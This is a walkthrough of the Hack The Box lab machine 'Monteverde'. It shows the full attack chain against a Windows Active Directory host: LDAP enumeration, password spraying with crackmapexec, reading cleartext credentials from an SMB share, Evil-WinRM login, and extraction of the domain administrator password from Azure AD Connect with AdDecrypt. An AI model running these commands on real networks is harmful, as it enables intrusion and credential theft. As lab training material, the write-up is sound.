---
description: https://app.hackthebox.com/machines/Monteverde
---

# Monteverde

## Nmap

```
sudo nmap 10.10.10.172 -p- -sS -sV                                                                       

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-21 13:29:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
53501/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

{% hint style="info" %}
Add "10.10.10.172 megabank.local" to /etc/hosts.
{% endhint %}

Starting out again `LDAP` we fire off a few `nmap` scripts with null credentials.

```bash
nmap -n -sV -Pn --script "ldap* and not brute" '10.10.10.172'
```

![](<../../../.gitbook/assets/image (2055) (1) (1) (1).png>)

This returns a large amount of information. This time, we can utilize `ldapsearch` to `grep` for userPrincipalName's

```bash
ldapsearch -x -h '10.10.10.172' -D '' -w '' -b "DC=megabank,DC=local" | grep userPrincipalName | sed 's/userPrincipalName: //' | sort
```

![](<../../../.gitbook/assets/image (2044) (1) (1) (1) (1) (1).png>)

With valid user accounts we check them against Impacket's `GetNPUsers.py` for any accounts that may have "Do not require kerberos preauthentication" enabled. As shown below we have zero valid results.

![](<../../../.gitbook/assets/image (2085) (1) (1).png>)

Using `crackmapexec` we can spray the known usernames against themselves, looking for weak passwords against `SMB`.

```
crackmapexec smb 10.10.10.172 -u ~/monteverde/Users.txt -p ~/monteverde/Users.txt 
```

![](<../../../.gitbook/assets/image (2045) (1) (1) (1).png>)

Which returns valid credentials for the account _SABatchJobs_.

**Credentials**

```
SABatchJobs:SABatchJobs
```

![](<../../../.gitbook/assets/image (2041).png>)

Using `smbmap` with our new found account we see we have read access to the non default share "users$". Of which, the share contains a file of interest `azure.xml` under the user _mhope_.

```
smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R
```

![](<../../../.gitbook/assets/image (2083) (1) (1) (1).png>)

The file fortunately has clear text credentials.

![](<../../../.gitbook/assets/image (2048) (1) (1) (1) (1).png>)

**Credentials**

```
mhope:4n0therD4y@n0th3r$
```

Checking the credentials against `Evil-WinRM` gives us a valid login to the target system.

```
evil-winrm -u mhope -p 4n0therD4y@n0th3r$ -i 10.10.10.172
```

Once logged in, we can check the group memberships for the account `mhope`. Noticing the user is a member of "Azure Admins" is of interest.

![](<../../../.gitbook/assets/image (2046) (1) (1) (1) (1).png>)

Further basic enumeration shows Azure AD Connect is installed.

![](<../../../.gitbook/assets/image (2068) (1) (1) (1) (1) (1).png>)

Azure AD Connect is used to synchronize on premise AD identities and passwords up to Azure AD (AAD) and vice versa.

Azure AD Connect provides the following features:

* [Password hash synchronization](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs) - A sign-in method that synchronizes a hash of a users on-premises AD password with Azure AD.
* [Pass-through authentication](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-pta) - A sign-in method that allows users to use the same password on-premises and in the cloud, but doesn't require the additional infrastructure of a federated environment.
* [Federation integration](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-fed-whatis) - Federation is an optional part of Azure AD Connect and can be used to configure a hybrid environment using an on-premises AD FS infrastructure. It also provides AD FS management capabilities such as certificate renewal and additional AD FS server deployments.
* [Synchronization](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-whatis) - Responsible for creating users, groups, and other objects. As well as, making sure identity information for your on-premises users and groups is matching the cloud. This synchronization also includes password hashes.
* [Health Monitoring](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect#what-is-azure-ad-connect-health) - Azure AD Connect Health can provide robust monitoring and provide a central location in the Azure portal to view this activity.

Researching possible exploits with Azure AD Connect I came across the following blog post from VBscub, as well as tool to grab the plain text credentials stored in Azure AD Connect .

**VBscrub:** [https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)

**Github:** [https://github.com/VbScrub/AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)

Download the exploit and uploaded the contents to _mhope's_ Documents directory.

```
upload /home/kali/AdDecrypt.exe
upload /home/kali/mcrypt.dll
```

Then change directory to `"C:\Program Files\Microsoft Azure AD Sync\Bin"`. From here execute the `AdDecrypt.exe` from `mhope's` Documents directory.

```
cmd.exe /c c:\users\mhope\documents\AdDecrypt.exe -fullSQL
```

![](<../../../.gitbook/assets/image (2043) (1) (1).png>)

Which gives us the domain administrator credentials.

**Credentials**

```
administrator:d0m@in4dminyeah!
```

Where we are able to log in with `Evil-WinRM` and grab the root flag.

![](<../../../.gitbook/assets/image (2059) (1) (1) (1) (1) (1).png>)
